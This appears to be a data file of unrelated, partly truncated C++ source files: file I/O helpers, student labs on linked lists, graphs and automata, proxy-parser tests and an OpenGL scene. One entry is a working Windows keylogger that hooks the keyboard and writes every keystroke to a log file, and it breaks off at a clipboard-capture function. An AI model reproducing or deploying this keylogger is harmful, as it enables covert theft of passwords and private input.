    "// Common/C_FileIO.h\n\n#include \"C_FileIO.h\"\n\n#include <fcntl.h>\n#include <unistd.h>\n\nnamespace NC {\nnamespace NFile {\nnamespace NIO {\n\nbool CFileBase::OpenBinary(const char *name, int flags)\n{\n  #ifdef O_BINARY\n  flags |= O_BINARY;\n  #endif\n  Close();\n  _handle = ::open(name, flags, 0666);\n  return _handle != -1;\n}\n\nbool CFileBase::Close()\n{\n  if(_handle == -1)\n    return true;\n  if (close(_handle) != 0)\n    return false;\n  _handle = -1;\n  return true;\n}\n\nbool CFileBase::GetLength(UInt64 &length) const\n{\n  off_t curPos = Seek(0, SEEK_CUR);\n  off_t lengthTemp = Seek(0, SEEK_END);\n  Seek(curPos, SEEK_SET);\n  length = (UInt64)lengthTemp;\n  return true;\n}\n\noff_t CFileBase::Seek(off_t distanceToMove, int moveMethod) const\n{\n  return ::lseek(_handle, distanceToMove, moveMethod);\n}\n\n/////////////////////////\n// CInFile\n\nbool CInFile::Open(const char *name)\n{\n  return CFileBase::OpenBinary(name, O_RDONLY);\n}\n\nssize_t CInFile::Read(void *data, size_t size)\n{\n  return read(_handle, data, size);\n}\n\n/////////////////////////\n// COutFile\n\nbool COutFile::Create(const char *name, bool createAlways)\n{\n  if (createAlways)\n  {\n    Close();\n    _handle = ::creat(name, 0666);\n    return _handle != -1;\n  }\n  return OpenBinary(name, O_CREAT | O_EXCL | O_WRONLY);\n}\n\nssize_t COutFile::Write(const void *data, size_t size)\n{\n  return write(_handle, data, size);\n}\n\n}}}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include \"hydro.h\"\r\nusing namespace std;\r\n\r\nvoid displayHeader() {\r\n\t\r\n    cout << \"Program: River Flow Data Linked List, Fall 2024\" << endl;\r\n    cout << \"Version: 1.0\" << endl;\r\n    cout << \"Lab Section: L01\" << endl;\r\n    cout << \"Produced by: Taha Zuberi\" << endl;\r\n    pressEnter();\r\n\t\r\n}\r\n\r\nint readData(FlowList& list) {\r\n\t\r\n\t\r\n    ifstream file(\"flow.txt\");\r\n\t\r\n    if (!file) {\r\n\t\t\r\n        cerr << \"Error: Cannot open file.\" << endl;\r\n        exit(1);\r\n\t\t\r\n    }\r\n\r\n    int count = 0;\r\n    ListItem temp;\r\n\t\r\n\t\r\n    while (file >> temp.year >> temp.flow) {\r\n\t\t\r\n\t\t\r\n        list.insert(temp);\r\n        count++;\r\n\t\t\r\n    }\r\n\t\r\n    file.close();\r\n    return count;\r\n\t\r\n}\r\n\r\nvoid display(const FlowList& list) {\r\n\t\r\n\t\r\n    list.display();\r\n    cout << \"The annual average of the flow is: \" << list.average() << \" billions of cubic meters.\" << endl;\r\n    pressEnter();\r\n\t\r\n}\r\n\r\nvoid addData(FlowList& list) {\r\n\t\r\n\t\r\n    ListItem newItem;\r\n    cout << \"Please enter a year: \";\r\n    cin >> newItem.year;\r\n    cout << \"Please enter the flow: \";\r\n    cin >> newItem.flow;\r\n    list.insert(newItem);\r\n    pressEnter();\r\n\t\r\n\t\r\n}\r\n\r\nvoid removeData(FlowList& list) {\r\n\t\r\n\t\r\n    int year;\r\n    cout << \"Please enter the year that you want to remove: \";\r\n    cin >> year;\r\n    list.remove(year);\r\n    pressEnter();\r\n\t\r\n\t\r\n}\r\n\r\n\r\nvoid saveData(const FlowList& list) {\r\n\t\r\n\t\r\n    ofstream file(\"flow.txt\");\r\n\t\r\n\t\r\n    if (!file) {\r\n\t\t\r\n        cerr << \"Error: Cannot open file.\" << endl;\r\n        return;\r\n\t\t\r\n    }\r\n\r\n    Node* current = list.getHead();\r\n\t\r\n\t\r\n    while (current) {\r\n\t\t\r\n        file << current->item.year << \" \" << current->item.flow << endl;\r\n        current = current->next;\r\n\t\t\r\n    }\r\n\t\r\n    file.close();\r\n\t\r\n\t\r\n    cout << \"Data are saved into the file.\" << endl;\r\n\t\r\n    pressEnter();\r\n\t\r\n\t\r\n}\r\n\r\nint menu() {\r\n\t\r\n\r\n    cout << \"Please select one of the following operations:\" << endl;\r\n    cout << \"1. Display flow list, and the average\" << endl;\r\n    cout << \"2. Add data\" << endl;\r\n    cout << \"3. Save data into the file\" << endl;\r\n    cout << \"4. Remove data\" << endl;\r\n    cout << \"5. Quit\" << endl;\r\n    cout << \"Enter your choice (1, 2, 3, 4, or 5): \";\r\n\t\r\n\t\r\n    int choice;\r\n\t\r\n    cin >> choice;\r\n\t\r\n    return choice;\r\n\t\r\n}\r\n\r\nvoid pressEnter() {\r\n\t\r\n    cout << \"\\n<<< Press Enter to Continue >>>>\" << endl;\r\n\t\r\n\t\r\n    cin.ignore();\r\n    cin.get();\r\n}\r\n\r\nint main() {\r\n\t\r\n\t\r\n    FlowList list;\r\n    int numRecords;\r\n\r\n    displayHeader();\r\n\t\r\n    numRecords = readData(list);\r\n\t\r\n    bool quit = false;\r\n\r\n    while (!quit) {\r\n\t\t\r\n        switch (menu()) {\r\n\t\t\t\r\n            case 1:\r\n                display(list);\r\n                break;\r\n\t\t\t\t\r\n            case 2:\r\n                addData(list);\r\n                break;\r\n\t\t\t\t\r\n            case 3:\r\n                saveData(list);\r\n                break;\r\n\t\t\t\t\r\n            case 4:\r\n                removeData(list);\r\n                break;\r\n\t\t\t\t\r\n            case 5:\r\n                cout << \"Program terminated successfully.\\n\";\r\n                quit = true;\r\n                break;\r\n\t\t\t\t\r\n            default:\r\n                cout << \"Invalid input. Please try again.\\n\";\r\n\t\t\t\t\r\n        }\r\n\t\t\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"../include/graph.hpp\"\nusing namespace std;\n// Addition Node\nNode* Graph::add(Node* a, Node* b) {\n    Node* node = new Node();\n    node->inputs = { a, b };\n\n    // Forward pass\n    node->forward = [node, a, b]() {\n        node->value = make_shared<Tensor>(Tensor(vector<float>()));\n        for (size_t i = 0; i < a->value->data.size(); ++i) {\n            node->value->data.push_back(a->value->data[i] + b->value->data[i]);\n        }\n        };\n\n    // Backward pass\n    node->backward = [a, b](vector<float>& grad) {\n        a->gradient.resize(grad.size());\n        b->gradient.resize(grad.size());\n        for (size_t i = 0; i < grad.size(); ++i) {\n            a->gradient[i] += grad[i];\n            b->gradient[i] += grad[i];\n        }\n        };\n\n    return node;\n}\n\n// Multiplication Node\nNode* Graph::multiply(Node* a, Node* b) {\n    Node* node = new Node();\n    node->inputs = { a, b };\n\n    // Forward pass\n    node->forward = [node, a, b]() {\n        node->value = make_shared<Tensor>(Tensor(vector<float>()));\n        for (size_t i = 0; i < a->value->data.size(); ++i) {\n            node->value->data.push_back(a->value->data[i] * b->value->data[i]);\n        }\n        };\n\n    // Backward pass\n    node->backward = [a, b](vector<float>& grad) {\n        a->gradient.resize(grad.size());\n        b->gradient.resize(grad.size());\n        for (size_t i = 0; i < grad.size(); ++i) {\n            a->gradient[i] += grad[i] * b->value->data[i];\n            b->gradient[i] += grad[i] * a->value->data[i];\n        }\n        };\n\n    return node;\n}\n\n// Forward Pass\nvoid Graph::forward(Node* node) {\n    for (Node* input : node->inputs) {\n        forward(input);\n    }\n    if (node->forward) {\n        node->forward();\n    }\n}\n\n// Backward Pass\nvoid Graph::backward(Node* node) {\n    if (node->gradient.empty()) {\n        node->gradient.resize(node->value->data.size(), 1.0f); // Initialize gradient for the final node\n    }\n\n    if (node->backward) {\n        node->backward(node->gradient);\n    }\n\n    for (Node* input : node->inputs) {\n        backward(input);\n    }\n}\n",
    "#include <iostream>\n#include \"proxy_parse.hpp\"\n\nvoid print_test_result(const char *test_name, bool passed)\n{\n    std::cout << test_name << \": \" << (passed ? \"PASSED\" : \"FAILED\") << std::endl;\n}\n\nvoid test_ParsedRequest_parse()\n{\n    std::cout << \"\\n=== Test Case 1: Basic Request ===\\n\";\n    \n    // Test case 1: Valid request\n    const char *request1 = \"GET http://example.com/path HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    ParsedRequest *req = ParsedRequest_create();\n    \n    std::cout << \"Input request: \" << request1 << std::endl;\n    int result = ParsedRequest_parse(req, request1, strlen(request1));\n    std::cout << \"Parse result: \" << result << std::endl;\n\n    if (result != 0) {\n        std::cout << \"FAILED: Parsing returned error code: \" << result << std::endl;\n    } else {\n        std::cout << \"Checking parsed values:\\n\";\n        \n        // Print raw pointer values for debugging\n        std::cout << \"Pointers - \"\n                  << \"method: \" << (void*)req->method \n                  << \" protocol: \" << (void*)req->protocol \n                  << \" host: \" << (void*)req->host \n                  << \" path: \" << (void*)req->path \n                  << \" version: \" << (void*)req->version << std::endl;\n\n        // Safe printing of values\n        std::cout << \"Values:\\n\"\n                  << \"  Method: \" << (req->method ? req->method : \"NULL\") << \"\\n\"\n                  << \"  Protocol: \" << (req->protocol ? req->protocol : \"NULL\") << \"\\n\"\n                  << \"  Host: \" << (req->host ? req->host : \"NULL\") << \"\\n\"\n                  << \"  Path: \" << (req->path ? req->path : \"NULL\") << \"\\n\"\n                  << \"  Version: \" << (req->version ? req->version : \"NULL\") << std::endl;\n\n        // Validate results\n        bool test1_passed = (req->method && strcmp(req->method, \"GET\") == 0) &&\n                           (req->protocol && strcmp(req->protocol, \"http\") == 0) &&\n                           (req->host && strcmp(req->host, \"example.com\") == 0) &&\n                           (req->path && strcmp(req->path, \"/path\") == 0) &&\n                           (req->version && strcmp(req->version, \"HTTP/1.1\") == 0);\n\n        print_test_result(\"Basic request parsing\", test1_passed);\n    }\n    ParsedRequest_destroy(req);\n\n    // Test case 2: Request with port\n    std::cout << \"\\n=== Test Case 2: Request with Port ===\\n\";\n    const char *request2 = \"GET http://example.com:8080/path HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    req = ParsedRequest_create();\n    result = ParsedRequest_parse(req, request2, strlen(request2));\n\n    if (result == 0 && req->port && req->host)\n    {\n        bool test2_passed = (strcmp(req->port, \"8080\") == 0 &&\n                             strcmp(req->host, \"example.com\") == 0);\n        print_test_result(\"Request with port parsing\", test2_passed);\n        std::cout << \"  Host: \" << req->host << std::endl;\n        std::cout << \"  Port: \" << req->port << std::endl;\n    }\n    else\n    {\n        print_test_result(\"Request with port parsing\", false);\n    }\n    ParsedRequest_destroy(req);\n\n    // Test case 3: Request with empty path\n    std::cout << \"\\n=== Test Case 3: Request with Empty Path ===\\n\";\n    const char *request3 = \"GET http://example.com HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    req = ParsedRequest_create();\n    result = ParsedRequest_parse(req, request3, strlen(request3));\n\n    bool test3_passed = (result == 0 &&\n                         strcmp(req->path, \"/\") == 0 &&\n                         strcmp(req->host, \"example.com\") == 0);\n\n    print_test_result(\"Request with empty path parsing\", test3_passed);\n    if (test3_passed)\n    {\n        std::cout << \"  Host: \" << req->host << std::endl;\n        std::cout << \"  Path: \" << req->path << std::endl;\n    }\n    ParsedRequest_destroy(req);\n}\n\nvoid test_ParsedRequest_create()\n{\n    ParsedRequest *req = ParsedRequest_create();\n    print_test_result(\"ParsedRequest_create\", req != NULL);\n    ParsedRequest_destroy(req);\n}\n\nvoid test_ParsedHeader_set_get()\n{\n    ParsedRequest *req = ParsedRequest_create();\n    const char *key = \"Content-Type\";\n    const char *value = \"text/html\";\n\n    int result = ParsedHeader_set(req, key, value);\n    ParsedHeader *header = ParsedHeader_get(req, key);\n\n    if (result == 0 && header != NULL &&\n        strcmp(header->val, value) == 0)\n    {\n        std::cout << \"ParsedHeader_set_get: PASSED\" << std::endl;\n    }\n    else\n    {\n        std::cout << \"ParsedHeader_set_get: FAILED\" << std::endl;\n    }\n\n    ParsedRequest_destroy(req);\n}\n\nvoid test_ParsedHeader_remove()\n{\n    ParsedRequest *req = ParsedRequest_create();\n    const char *key = \"Content-Type\";\n    const char *value = \"text/html\";\n\n    ParsedHeader_set(req, key, value);\n    int result = ParsedHeader_remove(req, key);\n    ParsedHeader *header = ParsedHeader_get(req, key);\n\n    if (result == 0 && header == NULL)\n    {\n        std::cout << \"ParsedHeader_remove: PASSED\" << std::endl;\n    }\n    else\n    {\n        std::cout << \"ParsedHeader_remove: FAILED\" << std::end",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <stack>\n#include <functional>\nusing namespace std;\n\nclass Graph {\nprivate:\n    int vertices;\n    vector<vector<int>> adj_matrix;\n    vector<vector<int>> adj_list;\n\npublic:\n    Graph(int v) : vertices(v), adj_matrix(v, vector<int>(v, 0)), adj_list(v) {}\n\n    void addEdgeMatrix(int u, int v) {\n        if (u >= 0 && u < vertices && v >= 0 && v < vertices) {\n            adj_matrix[u][v] = 1;\n            adj_matrix[v][u] = 1; // Uncomment for undirected graph\n        }\n        else {\n            cout << \"Invalid edge (\" << u << \", \" << v << \").\" << endl;\n        }\n    }\n\n    void addEdgeList(int u, int v) {\n        if (u >= 0 && u < vertices && v >= 0 && v < vertices) {\n            adj_list[u].push_back(v);\n            adj_list[v].push_back(u); // Uncomment for undirected graph\n        }\n        else {\n            cout << \"Invalid edge (\" << u << \", \" << v << \").\" << endl;\n        }\n    }\n\n    void displayMatrix() {\n        cout << \"Adjacency Matrix:\" << endl;\n        for (const auto& row : adj_matrix) {\n            for (int val : row) {\n                cout << val << \" \";\n            }\n            cout << endl;\n        }\n    }\n\n    void displayList() {\n        cout << \"Adjacency List:\" << endl;\n        for (int i = 0; i < vertices; ++i) {\n            cout << i << \": \";\n            for (int neighbor : adj_list[i]) {\n                cout << neighbor << \" \";\n            }\n            cout << endl;\n        }\n    }\n\n    void bfs(int start) {\n        vector<bool> visited(vertices, false);\n        queue<int> q;\n        vector<int> order;\n\n        visited[start] = true;\n        q.push(start);\n\n        while (!q.empty()) {\n            int node = q.front();\n            q.pop();\n            order.push_back(node);\n\n            for (int neighbor : adj_list[node]) {\n                if (!visited[neighbor]) {\n                    visited[neighbor] = true;\n                    q.push(neighbor);\n                }\n            }\n        }\n\n        cout << \"BFS Order: \";\n        for (int node : order) {\n            cout << node << \" \";\n        }\n        cout << endl;\n    }\n\n    void dfs(int start) {\n        vector<bool> visited(vertices, false);\n        vector<int> order;\n\n        function<void(int)> dfsHelper = [&](int node) {\n            visited[node] = true;\n            order.push_back(node);\n\n            for (int neighbor : adj_list[node]) {\n                if (!visited[neighbor]) {\n                    dfsHelper(neighbor);\n                }\n            }\n            };\n\n        dfsHelper(start);\n\n        cout << \"DFS Order: \";\n        for (int node : order) {\n            cout << node << \" \";\n        }\n        cout << endl;\n    }\n};\n\nint main() {\n    int vertices, edges;\n    cout << \"Enter the number of vertices: \";\n    cin >> vertices;\n    cout << \"Enter the number of edges: \";\n    cin >> edges;\n\n    Graph graph(vertices);\n\n    cout << \"Enter edges (u v):\" << endl;\n    for (int i = 0; i < edges; ++i) {\n        int u, v;\n        cin >> u >> v;\n        graph.addEdgeMatrix(u, v);\n        graph.addEdgeList(u, v);\n    }\n\n    graph.displayMatrix();\n    graph.displayList();\n\n    int start;\n    cout << \"Enter the starting vertex for traversal: \";\n    cin >> start;\n\n    cout << \"Performing BFS...\" << endl;\n    graph.bfs(start);\n\n    cout << \"Performing DFS...\" << endl;\n    graph.dfs(start);\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <windows.h>\r\n#include <thread>\r\n#include <chrono>\r\n#include <string>\r\n#include <sstream>\r\n\r\n// Global variables\r\nstd::ofstream logFile(\"log.txt\", std::ios::out | std::ios::trunc);\r\n\r\n// Function to check key states\r\nstatic bool isShiftPressed() { return (GetKeyState(VK_SHIFT) & 0x8000) != 0; }\r\nstatic bool isCtrlPressed() { return (GetKeyState(VK_CONTROL) & 0x8000) != 0; }\r\nstatic bool isAltPressed() { return (GetKeyState(VK_MENU) & 0x8000) != 0; }\r\nstatic bool isNumLockOn() { return (GetKeyState(VK_NUMLOCK) & 0x1) != 0; }\r\n\r\n// Function to convert the virtual key code to a readable string\r\nstatic std::string keyToString(DWORD keyCode) {\r\n    char keyBuffer[5] = { 0 };\r\n\r\n    if ((keyCode >= 0x41 && keyCode <= 0x5A)) { // Alphabet keys\r\n        if (isShiftPressed() ^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)) {\r\n            keyBuffer[0] = static_cast<char>(keyCode);\r\n        }\r\n        else {\r\n            keyBuffer[0] = static_cast<char>(tolower(keyCode));\r\n        }\r\n        return std::string(keyBuffer);\r\n    }\r\n\r\n    static const char* nums = \"0123456789\";\r\n    static const char* specialNums = \")!@#$%^&*(\";\r\n    if (keyCode >= 0x30 && keyCode <= 0x39) {\r\n        return std::string(1, isShiftPressed() ? specialNums[keyCode - 0x30] : nums[keyCode - 0x30]);\r\n    }\r\n\r\n    switch (keyCode) {\r\n    case VK_NUMPAD0: return \"0\";\r\n    case VK_NUMPAD1: return \"1\";\r\n    case VK_NUMPAD2: return \"2\";\r\n    case VK_NUMPAD3: return \"3\";\r\n    case VK_NUMPAD4: return \"4\";\r\n    case VK_NUMPAD5: return \"5\";\r\n    case VK_NUMPAD6: return \"6\";\r\n    case VK_NUMPAD7: return \"7\";\r\n    case VK_NUMPAD8: return \"8\";\r\n    case VK_NUMPAD9: return \"9\";\r\n    case VK_DECIMAL: return \".\";\r\n    case VK_DIVIDE: return \"/\";\r\n    case VK_MULTIPLY: return \"*\";\r\n    case VK_SUBTRACT: return \"-\";\r\n    case VK_ADD: return \"+\";\r\n    case VK_OEM_1: return isShiftPressed() ? \":\" : \";\";\r\n    case VK_OEM_PLUS: return isShiftPressed() ? \"+\" : \"=\";\r\n    case VK_OEM_COMMA: return isShiftPressed() ? \"<\" : \",\";\r\n    case VK_OEM_MINUS: return isShiftPressed() ? \"_\" : \"-\";\r\n    case VK_OEM_PERIOD: return isShiftPressed() ? \">\" : \".\";\r\n    case VK_OEM_2: return isShiftPressed() ? \"?\" : \"/\";\r\n    case VK_OEM_3: return isShiftPressed() ? \"~\" : \"`\";\r\n    case VK_OEM_4: return isShiftPressed() ? \"{\" : \"[\";\r\n    case VK_OEM_5: return isShiftPressed() ? \"|\" : \"\\\\\";\r\n    case VK_OEM_6: return isShiftPressed() ? \"}\" : \"]\";\r\n    case VK_OEM_7: return isShiftPressed() ? \"\\\"\" : \"'\";\r\n    case VK_SPACE: return \"[SPACE]\";\r\n    case VK_RETURN: return \"[ENTER]\";\r\n    case VK_BACK: return \"[BACKSPACE]\";\r\n    case VK_TAB: return \"[TAB]\";\r\n    case VK_ESCAPE: return \"[ESC]\";\r\n    case VK_CAPITAL: return \"[CAPS LOCK]\";\r\n    case VK_LSHIFT: return \"[LEFT SHIFT]\";\r\n    case VK_RSHIFT: return \"[RIGHT SHIFT]\";\r\n    case VK_LCONTROL: return \"[LEFT CTRL]\";\r\n    case VK_RCONTROL: return \"[RIGHT CTRL]\";\r\n    case VK_LMENU: return \"[LEFT ALT]\";\r\n    case VK_RMENU: return \"[RIGHT ALT]\";\r\n    case VK_F1:  return \"[F1]\";\r\n    case VK_F2:  return \"[F2]\";\r\n    case VK_F3:  return \"[F3]\";\r\n    case VK_F4:  return \"[F4]\";\r\n    case VK_F5:  return \"[F5]\";\r\n    case VK_F6:  return \"[F6]\";\r\n    case VK_F7:  return \"[F7]\";\r\n    case VK_F8:  return \"[F8]\";\r\n    case VK_F9:  return \"[F9]\";\r\n    case VK_F10:  return \"[F10]\";\r\n    case VK_F11:  return \"[F11]\";\r\n    case VK_F12:  return \"[F12]\";\r\n    case VK_NUMLOCK: return \"[NUM-LOCK]\";\r\n    case VK_SCROLL:  return \"[SCROLL-LOCK]\";\r\n    case VK_CLEAR:   return \"[CLEAR]\";\r\n    case VK_SHIFT:   return \"[SHIFT]\";\r\n    case VK_CONTROL: return \"[CTRL]\";\r\n    case VK_MENU:    return \"[ALT]\";\r\n    case VK_PAUSE:   return \"[PAUSE]\";\r\n    case VK_PRIOR:   return \"[PAGEUP]\";\r\n    case VK_NEXT:    return \"[PAGEDOWN]\";\r\n    case VK_END:     return \"[END]\";\r\n    case VK_HOME:    return \"[HOME]\";\r\n    case VK_LEFT:    return \"[LEFT]\";\r\n    case VK_UP:      return \"[UP]\";\r\n    case VK_RIGHT:   return \"[RIGHT]\";\r\n    case VK_DOWN:    return \"[DOWN]\";\r\n    case VK_SELECT:  return \"[SELECT]\";\r\n    case VK_PRINT:   return \"[PRINT]\";\r\n    case VK_SNAPSHOT: return \"[PRTSCRN]\";\r\n    case VK_INSERT:  return \"[INS]\";\r\n    case VK_DELETE:  return \"[DEL]\";\r\n    case VK_HELP:    return \"[HELP]\";\r\n    case VK_LWIN:     return \"[WIN]\";\r\n    case VK_RWIN:     return \"[WIN]\";\r\n\r\n    default: return \"[UNKNOWN]\";\r\n    }\r\n}\r\n\r\n// Callback function to handle keyboard events\r\nLRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\r\n    if (nCode == HC_ACTION) {\r\n        PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);\r\n        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {\r\n            std::string keyStr = keyToString(p->vkCode);\r\n            std::cout << keyStr;\r\n            logFile << keyStr;\r\n            logFile.flush(); // Ensure data is written to disk immediately\r\n        }\r\n    }\r\n    return CallNextHookEx(NULL, nCode, wParam, lParam);\r\n}\r\n\r\n// Function to get data from clipboard and",
    "#ifndef __PROGTEST__\n#include <algorithm>\n#include <cassert>\n#include <cstdint>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <deque>\n#include <functional>\n#include <iostream>\n#include <limits>\n#include <list>\n#include <map>\n#include <optional>\n#include <queue>\n#include <set>\n#include <sstream>\n#include <stack>\n#include <vector>\n#include <unordered_map>\n#include <unordered_set>\n\nusing State = unsigned;\nusing Symbol = uint8_t;\nusing Word = std::vector<Symbol>;\n\nstruct MISNFA {\n    std::set<State> states;\n    std::set<Symbol> alphabet;\n    std::map<std::pair<State, Symbol>, std::set<State>> transitions;\n    std::set<State> initialStates;\n    std::set<State> finalStates;\n};\n\nstruct DFA {\n    std::set<State> states;\n    std::set<Symbol> alphabet;\n    std::map<std::pair<State, Symbol>, State> transitions;\n    State initialState;\n    std::set<State> finalStates;\n\n    bool operator==(const DFA& x) const = default; // requires c++20\n};\n#endif\n\n\n\n\nMISNFA EpsilonElimination(const MISNFA& nfa){\n\n    std::map<State, std::set<State>> EpsilonClosures; // to which states is possible to get by epsilon movement\n\n\n    for(auto & state : nfa.states){ // for each state bfs\n\n        std::set<State> visited;\n        std::queue<State> queue;\n        visited.insert(state);\n        queue.push(state);\n\n        while(!queue.empty()){\n            auto current = queue.front();\n            queue.pop();\n\n            auto it = nfa.transitions.find({current, 'e'});\n            if (it != nfa.transitions.end()){\n                auto ways = nfa.transitions.find({current,'e'})->second; // set of states by epsilon\n                for(auto & state_to_go : ways){\n                    if(!visited.contains(state_to_go)){\n                        visited.insert(state_to_go);\n                        queue.push(state_to_go);\n                    }\n                }\n            }\n\n\n        }\n\n        EpsilonClosures[state] = std::move(visited);\n    }\n\n    MISNFA newNfa = nfa;  // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043a\u043e\u043f\u0438\u044e \u0438\u0441\u0445\u043e\u0434\u043d\u043e\u0433\u043e \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0430\n    newNfa.transitions.clear();\n    newNfa.alphabet.erase('e');\n    for (const auto &state_pair : EpsilonClosures) {\n        State state = state_pair.first; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        const std::set<State> &closure = state_pair.second; // Closure \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f\n\n        for (auto &state_to_add : closure) {\n            for (auto &symbol : nfa.alphabet) {\n                if (symbol == 'e') continue; // \u041f\u0440\u043e\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u03b5\n\n                auto transition_original_nfa = nfa.transitions.find({state_to_add, symbol});\n                if (transition_original_nfa != nfa.transitions.end()) {\n                    for (auto &nfa_ways : transition_original_nfa->second) {\n\n                        newNfa.transitions[{state, symbol}].insert(nfa_ways);\n                    }\n                }\n            }\n        }\n    }\n\n\n\n    for (const auto &state_pair : EpsilonClosures) {\n        State state = state_pair.first;\n        const std::set<State> &closure = state_pair.second;\n\n        for (auto closureState : closure) {\n            if (nfa.finalStates.find(closureState) != nfa.finalStates.end()) {\n                newNfa.finalStates.insert(state);\n                break;\n            }\n        }\n    }\n\n    return newNfa;\n\n\n\n}\nvoid makeTotalDFA(DFA& m_DFA) {\n    if (m_DFA.states.empty()) {\n        return;\n    }\n\n    State deadState = *std::max_element(m_DFA.states.begin(), m_DFA.states.end()) + 1;\n\n    bool needDeadState = false;\n\n    for (State s : m_DFA.states) {\n        for (Symbol c : m_DFA.alphabet) {\n            if (m_DFA.transitions.find({s, c}) == m_DFA.transitions.end()) {\n                needDeadState = true;\n                break;\n            }\n        }\n        if (needDeadState) {\n            break;\n        }\n    }\n\n    if (!needDeadState) {\n        return;\n    }\n\n    m_DFA.states.insert(deadState);\n    for (Symbol c : m_DFA.alphabet) {\n        m_DFA.transitions[{deadState, c}] = deadState;\n    }\n\n    for (State s : m_DFA.states) {\n        for (Symbol c : m_DFA.alphabet) {\n            if (m_DFA.transitions.find({s, c}) == m_DFA.transitions.end()) {\n                m_DFA.transitions[{s, c}] = deadState;\n            }\n        }\n    }\n}\n\n\n\n\nDFA deleting_unreachable(DFA & start_dfa){\n\n    std::set<State> visited;\n    std::queue<State> queue;\n\n    visited.insert(start_dfa.initialState);\n    queue.push(start_dfa.initialState);\n\n    while(!queue.empty()){\n\n        auto current = queue.front();\n        queue.pop();\n\n        for(auto symbol : start_dfa.alphabet){\n            auto res = start_dfa.transitions.find({current, symbol});\n            if(res != start_dfa.transitions.end()){\n                if(!visited.contains(res->second)){\n                    visited.insert(res->second);\n                    queue.push(res->second);\n                }\n            }\n        }\n    }\n\n    DFA newDFA ;\n    newDFA.states = visited;\n    newDFA.alphabet = start_dfa.alphabet;\n    newDFA.initialState = start_dfa.initialState;\n\n    for(auto state : newDFA.states){\n",
    "#include <windows.h>  // for MS Windows\n#include <GL/glut.h>  // GLUT, include glu.h and gl.h\n#include<math.h>\n#define PI           3.14159265358979323846\n#include <cstdlib> // For rand()\n#include <ctime>   // For seeding rand()\n#include <mmsystem.h>\n#include <stdio.h>\n\nbool riyadh = false, rakib = false, siam= false, fahad = false;\n//Fahad\n\nfloat _trainMoveF = 80.0f;\nfloat _trainMove2 = -130.0f;\nfloat _carMoveF = 70.0f;\nfloat _carMovey = 0.0f;\nfloat _busMove = -120.0f;\nfloat _busMovey = 20.0f;\nfloat _boatMove = -120.0f;\nfloat _boatMove2 = 90.0f;\nfloat _wheelAngleF = 0.0f;\nfloat _cloudF = 0.0f;\nbool isRainingF = false;\nfloat r = 0.529f, g = 0.627f ,b = 0.745f;\nbool isDay = true; // Start with night scene\nbool isNightF = false; // Start with night scene\nfloat timeOfDay = 0.0f; // Simulates time of day (0.0f to 1.0f)\n\n\n\n\nvoid drawRainF(int dropCount)\n{\n    glColor3ub(173, 216, 230); // Light blue color for rain\n\n    glBegin(GL_LINES);\n    for (int i = 0; i < dropCount; i++)\n    {\n        float x = (rand() % 181) - 90; // Random x in range (-90 to 90)\n        float y = (rand() % 181) - 30; // Random y in range (-30 to 150)\n\n        glVertex2f(x, y);\n        glVertex2f(x, y - 5); // Slightly downward line for rain effect\n    }\n    glEnd();\n}\n\nvoid updateF(int value) {\n    _trainMoveF -= 0.7f;\n\n    if(_trainMoveF < -150.0f)\n    {\n        _trainMoveF = 80.0f;\n    }\n    _trainMove2 += 0.7f;\n\n    if(_trainMove2 > 130.0f)\n    {\n        _trainMove2 = -130.0f;\n    }\n\n    _carMoveF -= 1.0f;\n\n    if(_carMoveF < -200.0f)\n    {\n        _carMoveF = 80;\n    }\n    _carMovey += 0.09f;\n\n    if(_carMovey > 25.5f)\n    {\n        _carMovey = 0;\n    }\n\n\n    _busMove += 0.4f;\n\n    if(_busMove > 150.0f)\n    {\n        _busMove = -100;\n    }\n\n     _busMovey -= 0.05f;\n\n    if(_busMovey < -17.5f)\n    {\n        _busMovey = 13;\n    }\n\n     _boatMove += 0.2f;\n\n    if(_boatMove > 140.0f)\n    {\n        _boatMove = -120;\n    }\n\n    _boatMove2 -= 0.2f;\n\n    if(_boatMove2 < -180.0f)\n    {\n        _boatMove2 = 90;\n    }\n\n\n    _cloudF -=0.2f;\n    if(_cloudF < -300.0)\n    {\n        _cloudF = 0;\n    }\n\n    glutPostRedisplay();\n    glutTimerFunc(20,updateF , 0);\n}\n\n\nvoid initGLF() {\n\t// Set \"clearing\" or background color\n\tglClearColor(0.4f, 0.698f, 0.996f, 1.0f);\n}\n\nvoid circle(float x, float y, float radius,float r,float g,float b, bool wheel)\n{\n    int triangleAmount = 100; //# of triangles used to draw circle\n\n    GLfloat twicePi = 2.0f * PI;\n    glColor3ub(r, g, b); // Set color\n    glBegin(GL_TRIANGLE_FAN);\n    glVertex2f(x, y); // center of circle\n    for(int i = 0; i <= triangleAmount; i++)\n    {\n        glVertex2f(x + (radius * cos(i *  twicePi / triangleAmount)), y + (radius * sin(i * twicePi / triangleAmount)));\n    }\n    glEnd();\n\n    if(wheel)\n    {\n        // Draw spokes\n        int spokeCount=6;\n        glColor3f(0.0f, 0.0f, 0.0f); // Set color for spokes\n        for (int i = 0; i < spokeCount; i++)\n        {\n            float angle = i * twicePi / spokeCount;\n            float spokeX = x + radius * cos(angle);\n            float spokeY = y + radius * sin(angle);\n\n            glLineWidth(1);\n            glBegin(GL_LINES);\n            glVertex2f(x, y); // Center\n            glVertex2f(spokeX, spokeY); // Edge\n            glEnd();\n        }\n    }\n}\nvoid circle1F(float x, float y, 